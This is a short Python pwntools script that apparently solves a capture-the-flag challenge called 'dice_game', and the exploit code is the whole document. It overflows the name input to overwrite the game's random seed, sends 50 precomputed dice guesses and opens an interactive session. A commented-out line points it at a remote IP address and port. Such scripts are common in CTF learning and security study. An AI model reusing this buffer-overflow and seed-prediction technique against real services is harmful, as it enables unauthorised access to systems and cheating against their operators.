from pwn import *
p = process('./dice_game')
# p = remote("47.96.239.28", 9999)
p.readuntil("name:")
payload = p64(0x1122334455667788) * 8 + p64(0)
p.sendline(payload)
ans = "25426251423232651155634433322261116425254446323361"
i = 0
while i < 50:
        p.readuntil("nt(1~6): ")
        n = ans[i]
        i += 1
        p.sendline(n)
p.interactive()
